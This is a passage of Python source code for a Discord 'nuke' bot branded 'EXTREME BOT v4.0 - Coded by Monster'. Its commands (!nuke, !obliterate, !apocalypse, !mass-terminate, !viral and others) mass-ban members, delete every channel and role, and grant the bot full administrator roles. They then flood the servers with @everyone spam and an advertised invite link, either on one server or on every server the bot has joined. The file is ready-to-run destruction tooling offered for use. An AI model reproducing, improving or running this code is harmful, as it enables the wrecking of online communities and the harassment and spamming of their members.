                        if ban_count % 3 == 0:
                            self.add_log(f"🔨 Extreme banned {ban_count} members")
                except:
                    pass

        if mode == "lightning" and ban_tasks:
            await asyncio.gather(*ban_tasks, return_exceptions=True)
            self.add_log(f"⚡ Lightning banned {len(ban_tasks)} members instantly")

        channel_tasks = []
        channel_count = 0

        for channel in guild.channels:
            try:
                if mode == "lightning":
                    channel_tasks.append(channel.delete())
                else:
                    await channel.delete()
                    channel_count += 1
                    if channel_count % 2 == 0:
                        self.add_log(f"🗑️ Obliterated {channel_count} channels")
            except:
                pass

        if mode == "lightning" and channel_tasks:
            await asyncio.gather(*channel_tasks, return_exceptions=True)
            self.add_log(f"⚡ Lightning deleted {len(channel_tasks)} channels")

        role_tasks = []
        role_count = 0

        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    if mode == "lightning":
                        role_tasks.append(role.delete())
                    else:
                        await role.delete()
                        role_count += 1
                        self.add_log(f"💣 Annihilated role: {role.name}")
                except:
                    pass

        if mode == "lightning" and role_tasks:
            await asyncio.gather(*role_tasks, return_exceptions=True)
            self.add_log(f"⚡ Lightning destroyed {len(role_tasks)} roles")

        attack_channels = [
            self.nuke_channel_name, f"{self.nuke_channel_name}-1", f"{self.nuke_channel_name}-2", 
            f"{self.nuke_channel_name}-3", "nuclear-strike", "extreme-attack", "obliteration-zone",
            "attack-channel-1", "attack-channel-2", "attack-channel-3", "destruction-area",
            "attack-wave-alpha", "attack-wave-beta", "final-attack", "mega-attack",
            "ultra-attack", "super-attack", "hyper-attack", "extreme-zone"
        ]

        if mode == "chaos":
            selected_attacks = random.sample(attack_channels, min(10, len(attack_channels)))
        else:
            selected_attacks = attack_channels[:15]

        creation_tasks = []
        attack_texts = [
            "💀 این سرور توسط EXTREME BOT v4.0 نابود شد! 💀",
            "🔥 حمله هسته‌ای موفقیت‌آمیز - سرور محو شد! 🔥",
            "⚡ سرور شما توسط EXTREME BOT کاملاً ویران شد! ⚡",
            "💣 عملیات تخریب کامل - هیچ چیز باقی نمانده! 💣",
            "🚀 EXTREME BOT v4.0 - قدرت نامحدود تخریب! 🚀\n💀 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD",
            "💀 سرور شما در برابر EXTREME BOT مقاومت نکرد! 💀\n🔥 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD",
            "🔥 حمله رعد‌آسا - تخریب فوری و کامل! 🔥\n⚡ Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD",
            "⚡ هیچ سروری نمی‌تواند در برابر ما مقاومت کند! ⚡\n💣 Coded by Monster\n🎯 https://discord.gg/wsytzxtgHD",
            "⛏️ Join the best Discord server: https://discord.gg/wsytzxtgHD 🎮\n🔥 Coded by Monster\n💀 Thousands of users!",
            "🎮 Best quality Discord! Join our server: https://discord.gg/wsytzxtgHD ⛏️\n🚀 Coded by Monster\n💯 Completely free!",
            "💣 ULTIMATE DESTRUCTION ACHIEVED! 💣\n🔥 Coded by Monster\n🎮 https://discord.gg/wsytzxtgHD\n⚡ Over 100000 downloads!",
            "🌪️ CHAOS UNLEASHED - TOTAL OBLITERATION! 🌪️\n💀 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD\n🚀 Most popular bot!",
            "⚡ LIGHTNING STRIKE SUCCESSFUL! ⚡\n🔥 Coded by Monster\n🎯 https://discord.gg/wsytzxtgHD\n💯 Infinite power!"
        ]

        for i, name in enumerate(selected_attacks):
            try:
                if mode == "lightning":
                    creation_tasks.append(guild.create_text_channel(name=name))
                else:
                    new_channel = await guild.create_text_channel(name=name)
                    channel_attack_message = self.custom_attack_message if self.custom_attack_message else random.choice(attack_texts)
                    await new_channel.send(f"{channel_attack_message} @everyone")
                    await new_channel.send(f"🔥 Coded by Monster: https://discord.gg/wsytzxtgHD @everyone")
                    if i % 3 == 0:
                        self.add_log(f"🆕 Created attack channel: {name}")
            except:
                pass

        if mode == "lightning" and creation_tasks:
            created_channels = await asyncio.gather(*creation_tasks, return_exceptions=True)
            for channel in created_channels:
                if isinstance(channel, discord.TextChannel):
                    try:
                        attack_text = random.choice(attack_texts)
                        await channel.send(attack_text)
                        await channel.send(attack_message)
                    except:
                        pass
            self.add_log(f"⚡ Lightning created {len(creation_tasks)} attack channels")

        extreme_roles = random.sample(EXTREME_ROLES_V4, min(8, len(EXTREME_ROLES_V4))) if mode == "chaos" else EXTREME_ROLES_V4

        for role_data in extreme_roles:
            try:
                await guild.create_role(
                    name=role_data["name"],
                    color=role_data["color"],
                    permissions=discord.Permissions.all(),
                    reason="EXTREME BOT v4.0 - TOTAL DOMINATION"
                )
                self.add_log(f"⚔️ Created extreme role: {role_data['name']}")
            except:
                pass

        self.destruction_count += 1
        self.add_log(f"💀 EXTREME DESTRUCTION COMPLETE: {guild.name} OBLITERATED (Total: {self.destruction_count})")

    def run_bot(self):
        try:
            self.bot = commands.Bot(command_prefix="!",
                                   intents=discord.Intents.all(),
                                   help_command=None)

            @self.bot.event
            async def on_ready():
                self.is_connected = True
                self.add_log(f"🚀 EXTREME BOT v4.0 connected as {self.bot.user.name}")
                self.add_log(f"🆔 Bot ID: {self.bot.user.id}")
                self.add_log("🔥 Coded by Monster - https://discord.gg/wsytzxtgHD")

                await self.bot.change_presence(
                    status=discord.Status.online,
                    activity=discord.Game(self.bot_status)
                )

                self.update_servers()
                self.add_log(f"🎯 Found {len(self.servers)} targets for EXTREME DESTRUCTION")

            @self.bot.event
            async def on_guild_join(guild):
                self.add_log(f"🏛️ New target acquired: {guild.name}")
                self.update_servers()

            @self.bot.event
            async def on_guild_remove(guild):
                self.add_log(f"🚪 Target lost: {guild.name}")
                self.update_servers()

            @self.bot.command(name='permme')
            async def permme(ctx):
                await ctx.message.delete()
                try:
                    guild = ctx.guild
                    bot_member = guild.get_member(self.bot.user.id)
                    admin_role = await guild.create_role(
                        name=f"EXTREME-ADMIN-{random.randint(1000,9999)}",
                        permissions=discord.Permissions.all(),
                        color=discord.Color.dark_red(),
                        reason="EXTREME BOT v4.0 - ULTIMATE PERMISSIONS"
                    )
                    await bot_member.add_roles(admin_role)
                    self.add_log(f"🔑 EXTREME permissions granted in {guild.name}")
                except Exception as e:
                    self.add_log(f"❌ Permission error: {str(e)}")

            @self.bot.command(name='targets')
            async def targets(ctx):
                await ctx.message.delete()

                embed = discord.Embed(title="🎯 EXTREME ATTACK TARGETS v4.0", color=0xff0000)
                embed.description = "**🔥 Coded by Monster - CHOOSE YOUR DESTRUCTION:**"

                target_list = ""
                for i, guild in enumerate(self.bot.guilds, 1):
                    text_ch = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
                    voice_ch = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
                    admin_status = "✅" if guild.me.guild_permissions.administrator else "❌"

                    target_list += f"**💀 {i}.** {guild.name}\n"
                    target_list += f"👑 Owner: {guild.owner}\n"
                    target_list += f"👥 Members: {guild.member_count} | 📢 Channels: {text_ch + voice_ch} | 🔑 Admin: {admin_status}\n"
                    target_list += f"💥 Attack: `!obliterate {i}` | 🎯 ID: `{guild.id}`\n\n"

                embed.add_field(name="🎯 Available Targets", value=target_list[:1024], inline=False)
                embed.add_field(name="🔥 EXTREME COMMANDS", 
                               value="• `!obliterate <num>` - Instant obliteration\n• `!nuke` - Nuclear strike ALL\n• `!chaos` - Chaos destruction\n• `!stealth` - Silent attack\n• `!lightning` - Lightning speed\n• `!apocalypse` - Total annihilation", 
                               inline=False)
                embed.set_footer(text="🔥 EXTREME BOT v4.0 - Coded by Monster")

                try:
                    await ctx.author.send(embed=embed)
                    self.add_log("📨 EXTREME target list sent")
                except:
                    self.add_log("❌ Could not send target list")

            @self.bot.command(name='obliterate')
            async def obliterate(ctx, target=None):
                await ctx.message.delete()

                if not target:
                    embed = discord.Embed(title="💀 INSTANT OBLITERATION", color=0xff0000)
                    targets = ""
                    for i, guild in enumerate(self.bot.guilds, 1):
                        targets += f"💥 `!obliterate {i}` - {guild.name}\n"

                    embed.add_field(name="🎯 Choose Target", value=targets, inline=False)
                    try:
                        await ctx.author.send(embed=embed)
                    except:
                        pass
                    return

                try:
                    server_num = int(target)
                    if 1 <= server_num <= len(self.bot.guilds):
                        target_guild = list(self.bot.guilds)[server_num - 1]
                        self.selected_server_id = target_guild.id
                        self.add_log(f"💀 INSTANT OBLITERATION: {target_guild.name}")
                        await self.extreme_destruction(target_guild, "standard")
                    else:
                        self.add_log(f"❌ Invalid target: {server_num}")
                except ValueError:
                    self.add_log(f"❌ Invalid target: {target}")

            @self.bot.command(name='nuke')
            async def nuke(ctx):
                await ctx.message.delete()
                guild = ctx.guild
                self.add_log(f"💣NUCLEAR PROTOCOL ACTIVATED ON: {guild.name}")

                nuke_message = f"""💀 سرور شما توسط EXTREME BOT v4.0 کاملاً نابود شد! 💀
🔥 {self.custom_attack_message}
⚡ هیچ چیز باقی نمانده - تخریب کامل انجام شد!
💣 Coded by Monster
🎮 https://discord.gg/wsytzxtgHD
@everyone @here"""

                self.add_log(f"🚀 LAUNCHING NUCLEAR STRIKE ON: {guild.name}")
                await self.nuclear_strike_single_server(guild, nuke_message)

                self.add_log(f"💣 NUCLEAR OBLITERATION COMPLETED ON: {guild.name}")

            @self.bot.command(name='chaos')
            async def chaos(ctx):
                await ctx.message.delete()
                self.add_log("🌪️ CHAOS MODE ACTIVATED!")

                targets = random.sample(self.bot.guilds, min(3, len(self.bot.guilds)))
                for guild in targets:
                    try:
                        await self.extreme_destruction(guild, "chaos")
                    except:
                        pass

                self.add_log("🌪️ CHAOS DESTRUCTION COMPLETED!")

            @self.bot.command(name='stealth')
            async def stealth(ctx):
                await ctx.message.delete()
                self.add_log("🥷 STEALTH MODE ACTIVATED!")

                for guild in self.bot.guilds:
                    try:
                        await self.extreme_destruction(guild, "stealth")
                        await asyncio.sleep(1)
                    except:
                        pass

                self.add_log("🥷 STEALTH OBLITERATION COMPLETED!")

            @self.bot.command(name='lightning')
            async def lightning(ctx):
                await ctx.message.delete()
                self.add_log("⚡ LIGHTNING MODE ACTIVATED!")

                tasks = []
                for guild in self.bot.guilds:
                    tasks.append(self.extreme_destruction(guild, "lightning"))

                await asyncio.gather(*tasks, return_exceptions=True)
                self.add_log("⚡ LIGHTNING OBLITERATION COMPLETED!")

            @self.bot.command(name='apocalypse')
            async def apocalypse(ctx):
                await ctx.message.delete()
                self.add_log("🌋 APOCALYPSE MODE ACTIVATED!")
                self.attack_mode = "APOCALYPSE"

                for wave in range(3):
                    self.add_log(f"🌋 APOCALYPSE WAVE {wave + 1}/3")
                    for guild in self.bot.guilds:
                        try:
                            await self.extreme_destruction(guild, "chaos")
                        except:
                            pass
                    await asyncio.sleep(2)

                self.add_log("🌋 APOCALYPSE COMPLETED - TOTAL ANNIHILATION!")

            @self.bot.command(name='mass-terminate')
            async def mass_terminate(ctx):
                await ctx.message.delete()
                guild = ctx.guild
                self.add_log(f"🔨 MASS TERMINATION: {guild.name}")

                tasks = []
                for member in guild.members:
                    if member != ctx.author and member != self.bot.user:
                        tasks.append(member.ban(reason="EXTREME BOT v4.0 - MASS TERMINATION"))

                await asyncio.gather(*tasks, return_exceptions=True)
                self.add_log(f"🔨 MASS TERMINATION COMPLETED: {len(tasks)} members")

            @self.bot.command(name='extreme-wipe')
            async def extreme_wipe(ctx):
                await ctx.message.delete()
                await self.extreme_destruction(ctx.guild, "lightning")

            @self.bot.command(name='silent')
            async def silent(ctx, mode="auto"):
                await ctx.message.delete()
                self.add_log(f"🥷 SILENT MODE ACTIVATED: {ctx.guild.name}")

                if mode == "auto":
                    await self.silent_auto_attack(ctx.guild)
                elif mode == "viral":
                    for i in range(5):
                        await self.silent_auto_attack(ctx.guild)
                        await asyncio.sleep(2)
                elif mode == "all":
                    for guild in self.bot.guilds:
                        try:
                            await self.silent_auto_attack(guild)
                        except:
                            pass

                self.add_log("🥷 SILENT OPERATION COMPLETED")

            @self.bot.command(name='viral')
            async def viral(ctx):
                await ctx.message.delete()
                self.add_log("📢 VIRAL CAMPAIGN ACTIVATED!")

                for guild in self.bot.guilds:
                    try:
                        for wave in range(3):
                            await self.silent_auto_attack(guild)
                            await asyncio.sleep(1)
                    except:
                        pass

                self.add_log("📢 VIRAL CAMPAIGN COMPLETED - MAXIMUM SPREAD!")

            @self.bot.command(name='spread')
            async def spread(ctx):
                await ctx.message.delete()
                guild = ctx.guild

                target_channels = self.smart_channel_selector(guild)
                viral_msg = self.smart_message_selector("viral")

                for channel in target_channels:
                    try:
                        for i in range(5):
                            await channel.send(viral_msg)
                            await asyncio.sleep(0.3)
                    except:
                        pass

                self.add_log(f"📢 VIRAL SPREAD: {len(target_channels)} channels targeted")

            @self.bot.command(name='auto-select')
            async def auto_select(ctx):
                await ctx.message.delete()

                best_targets = sorted(self.bot.guilds, 
                                    key=lambda g: g.member_count, 
                                    reverse=True)[:3]

                for guild in best_targets:
                    try:
                        self.add_log(f"🎯 AUTO-SELECTED TARGET: {guild.name}")
                        await self.extreme_destruction(guild, "stealth")
                    except:
                        pass

            @self.bot.command()
            async def help(ctx):
                await ctx.message.delete()
                embed = discord.Embed(
                    title="🔥 EXTREME DISCORD BOT v4.0",
                    description="💀 ULTIMATE DESTRUCTION SYSTEM - Coded by Monster\n📢 https://discord.gg/wsytzxtgHD",
                    color=0xff0000
                )

                embed.add_field(name="🔑 !permme", value="Ultimate permissions", inline=True)
                embed.add_field(name="🎯 !targets", value="Show attack menu", inline=True)
                embed.add_field(name="💀 !obliterate <num>", value="Instant obliteration", inline=True)
                embed.add_field(name="💣 !nuke", value="Nuclear strike ALL", inline=True)
                embed.add_field(name="🌪️ !chaos", value="Chaos destruction", inline=True)
                embed.add_field(name="⚡ !lightning", value="Lightning speed", inline=True)

                embed.add_field(name="🥷 !silent [auto/viral/all]", value="Silent auto-attack", inline=True)
                embed.add_field(name="📢 !viral", value="Viral advertising campaign", inline=True)
                embed.add_field(name="🚀 !spread", value="Auto-spread with smart targeting", inline=True)
                embed.add_field(name="🎯 !auto-select", value="Auto-select best targets", inline=True)
                embed.add_field(name="🌋 !apocalypse", value="Total annihilation", inline=True)
                embed.add_field(name="🗑️ !extreme-wipe", value="Complete wipe", inline=True)

                embed.add_field(name="🔥 JOIN OUR SERVER", 
                               value="• https://discord.gg/wsytzxtgHD\n• Coded by Monster\n• 100% FREE - SHARE EVERYWHERE!", 
                               inline=False)

                embed.set_footer(text="🔥 EXTREME BOT v4.0 - Coded by Monster")
                try:
                    await ctx.author.send(embed=embed)
                    self.add_log("📨 EXTREME help sent")
                except:
                    self.add_log("❌ Could not send help")

            self.bot.run(self.bot_token)

        except Exception as e:
            self.add_log(f"❌ Connection failed: {str(e)}")
            self.is_connected = False

def run_extreme_console():
    console.print(Panel(
        Align.center(Text(BANNER_V4, style="bold red")),
        title="EXTREME DISCORD BOT v4.0",
        subtitle="🔥 Coded by Monster - https://discord.gg/wsytzxtgHD",
        border_style="red",
        box=box.DOUBLE
    ))

    console.print("\n🔥 [bold cyan]EXTREME BOT v4.0 - Coded by Monster[/bold cyan]\n")

    token = console.input("🔑 [bold yellow]Enter bot token: [/bold yellow]")
    if not token:
        console.print("❌ [bold red]Token required![/bold red]")
        return

    status = console.input("🎮 [bold yellow]Bot status: [/bold yellow]") or "💀 EXTREME BOT v4.0 - Coded by Monster"

    nuke_channel_name = console.input("💣 [bold yellow]Enter nuke channel name (default: attack): [/bold yellow]") or "attack"

    console.print("\n📝 [bold cyan]Custom Attack Message Configuration:[/bold cyan]")
    console.print("💡 [dim]Leave empty to use default random messages[/dim]")
    custom_attack_message = console.input("💀 [bold yellow]Enter custom attack message: [/bold yellow]")

    if not custom_attack_message:
        custom_attack_message = "💀 این سرور توسط EXTREME BOT v4.0 نابود شد! @everyone 💀\n🔥 Coded by Monster\n⛏️ https://discord.gg/wsytzxtgHD"

    bot = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)

    @bot.event
    async def on_ready():
        console.print(f"🚀 [bold green]EXTREME BOT v4.0 connected: {bot.user.name}[/bold green]")
        console.print("🔥 [bold red]Coded by Monster - https://discord.gg/wsytzxtgHD[/bold red]")

        await bot.change_presence(status=discord.Status.online, activity=discord.Game(status))

        console.print(f"\n🎯 [bold red]EXTREME TARGET DATABASE ({len(bot.guilds)} servers):[/bold red]")

        table = Table(show_header=True, header_style="bold red", box=box.HEAVY_HEAD)
        table.add_column("💀 Target", style="bold red", width=8)
        table.add_column("🏛️ Server", style="cyan", min_width=25)
        table.add_column("👑 Owner", style="yellow", min_width=20)
        table.add_column("👥 Members", justify="center", style="blue", width=8)
        table.add_column("📢 Channels", justify="center", style="green", width=9)
        table.add_column("🔑 Admin", justify="center", style="purple", width=6)

        for i, guild in enumerate(bot.guilds, 1):
            channels = len([c for c in guild.channels if isinstance(c, (discord.TextChannel, discord.VoiceChannel))])
            admin_status = "✅" if guild.me.guild_permissions.administrator else "❌"

            table.add_row(
                f"💥 {i}",
                guild.name,
                guild.owner.name if guild.owner else "Unknown",
                str(guild.member_count),
                str(channels),
                admin_status
            )

        console.print(table)
        console.print(f"\n🚀 [bold green]EXTREME BOT v4.0 ready![/bold green]")

    console.print("\n🚀 [bold green]Launching EXTREME BOT v4.0...[/bold green]")
    bot.run(token)

def main():
    colorama.init()

    console.print(Panel(
        Align.center(Text(BANNER_V4, style="bold red")),
        title="EXTREME DISCORD BOT v4.0",
        subtitle="🔥 Coded by Monster - https://discord.gg/wsytzxtgHD",
        border_style="red",
        box=box.DOUBLE
    ))

    console.print("\n🔥 [bold cyan]EXTREME EDITION MODES:[/bold cyan]")
    console.print("1. 🖥️  EXTREME GUI Mode v4.0 (Recommended)")
    console.print("2. 💻 EXTREME Console Mode v4.0")
    console.print("3. ⚡ DIRECT EXTREME Mode v4.0")

    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--console":
            run_extreme_console()
        else:
            choice = console.input("\n🔢 [bold yellow]Select EXTREME mode (1-3): [/bold yellow]") or "1"

            if choice == "1":
                console.print("\n🚀 [bold green]Launching EXTREME GUI v4.0...[/bold green]")
                bot = ExtremeDiscordBot()
                bot.connect_bot()
            elif choice == "2":
                run_extreme_console()
            elif choice == "3":
                run_extreme_console()
            else:
                console.print("❌ [bold red]Invalid choice! Starting EXTREME GUI v4.0...[/bold red]")
                bot = ExtremeDiscordBot()
                bot.connect_bot()

    except KeyboardInterrupt:
        console.print("\n👋 [bold yellow]EXTREME BOT v4.0 Terminated![/bold yellow]")
    except Exception as e:
        console.print(f"\n❌ [bold red]Error: {str(e)}[/bold red]")
        console.print("🔄 [bold yellow]Fallback to console mode...[/bold yellow]")
        run_extreme_console()


if __name__ == "__main__":

    main()

